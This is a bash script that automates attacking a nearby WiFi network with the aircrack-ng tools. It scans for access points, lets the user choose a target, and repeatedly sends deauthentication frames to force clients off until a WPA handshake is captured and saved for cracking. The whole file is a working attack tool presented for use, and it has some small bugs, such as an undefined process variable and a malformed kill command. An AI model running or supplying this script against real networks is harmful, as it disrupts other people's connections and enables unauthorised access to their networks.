#!/bin/bash

# Text Formatting
format_text() {
  local color=$1
  local text=$2
  echo "$(tput setaf $color)$text$(tput sgr0)"
}

# Function to handle CTRL+C (SIGINT)
handle_sigint() {
  echo -e "\n$(format_text 1 "Operation cancelled.")"
  trap - SIGINT
  kill - SIGINT
}

# Function to check if a command exists
command_exists() {
  for cmd in "$@"; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      echo "$(format_text 1 "This script requires the $cmd to be installed.")"
      exit 1
    fi
  done
}

# Function to check for root privileges
check_root() {
  if [[ $EUID -ne 0 ]]; then
    echo -e "$(format_text 1 "This script must be run as root")" 
    exit 1
  fi
}

# Function to get the list of network adapters
get_adapters() {
  local adapters=$(ip link show | awk -F: '$0 ~ "wl"{print $2;getline}')
  if [ -z "$adapters" ]; then
    echo "$(format_text 1 "No network adapters found.")"
    exit 1
  fi
  echo "$adapters"
}

# Function to switch the adapter mode
switch_adapter_mode() {
  local adapter=$1
  local mode=$2
  ifconfig $adapter down
  iwconfig $adapter mode $mode
  ifconfig $adapter up
}

# Function to kill xterm process and exit the script
kill_xterm_and_exit() {
  echo -e "\n$(format_text 1 "Detected Networks:")"
  trap - SIGINT 
  killall -SIGINT $xterm_pid
  exit
}

# Function to switch the adapter back to managed mode
switch_to_managed_mode() {
  echo -e "$(format_text 3 'Do you want to switch the adapter back to managed mode?')"
  if gum confirm "$(format_text 3 "${SELECTED_ADAPTER}: ")"; then
    switch_adapter_mode $SELECTED_ADAPTER "managed"
  fi
}

# Main script
main() {
  trap handle_sigint SIGINT
  command_exists airodump-ng aireplay-ng gum
  check_root
  local adapters=$(get_adapters)
  echo "$(format_text 3 "Available Network Adapters:")"
  local selected_adapter=$(echo "$adapters" | gum choose | sed -e 's/^[[:space:]]*//')
  switch_adapter_mode $selected_adapter "monitor"
  trap kill_xterm_and_exit SIGINT
  xterm -hold -e "timeout 30 bash -c \"sudo airodump-ng -w dump --output-format csv $selected_adapter;\"" &
  xterm_pid=$!
  gum spin --spinner dot --title "$(format_text 5 "Scanning for nearby networks...")" -- bash -c "
  for ((i=0; i<15; i++)); do
    if ! ps -p $xterm_pid > /dev/null; then
      break
    fi
    sleep 1
  done"
  if ps -p $xterm_pid > /dev/null; then
    kill -SIGINT $xterm_pid
  fi
  sleep 1; clear
  latest_capture=$(ls -t dump*.csv | head -n 1)
  HANDSHAKES_DIR="/home/rival/handshakes"
  networks=$(awk -F, 'NR>2 {print "Name: "$14", BSSID: "$1", Channel: "$4}' "$latest_capture" | gum style --foreground cyan)
  selected_network=$(echo "$networks" | gum choose --height=25 --limit=1)
  bssid=$(echo $selected_network | awk -F', ' '{print $2}' | cut -d ' ' -f 2)
  channel=$(echo $selected_network | awk -F', ' '{print $3}' | cut -d ' ' -f 2)
  xterm -e "bash -c \"sudo airodump-ng -c ${channel} --bssid ${bssid} -w ${HANDSHAKES_DIR}/${bssid} ${selected_adapter};\"" & 
  airodump_pid=$!
  sleep 10
  gum spin --spinner points --title "Collecting handshakes and Deauthenticating clients" -- bash -c "
  while pgrep -x 'airodump-ng' >/dev/null
  do
    xterm -e 'bash -c \"while pgrep -x airodump-ng >/dev/null; do sudo aireplay-ng --deauth 0 -a $bssid -c $bssid $selected_adapter; sleep 8; done;\"' &
    break
  done
  " &
  while true; do
    for file in ${HANDSHAKES_DIR}/${bssid}*.cap; do
      if sudo aircrack-ng "${file}" 2>&1 | grep -q '1 handshake'; then
        sudo kill ${airodump_pid} && sudo kill ${aireplay_pid}
        break 2
      fi
    done
    if ! pgrep -x 'airodump-ng' >/dev/null; then
      echo "$(format_text 1 "No handshakes captured")"
      break
    fi
  done
  trap switch_to_managed_mode EXIT
  echo -e "$(format_text 2 'Script finished. Exiting...')"
  exit 0 
}

main

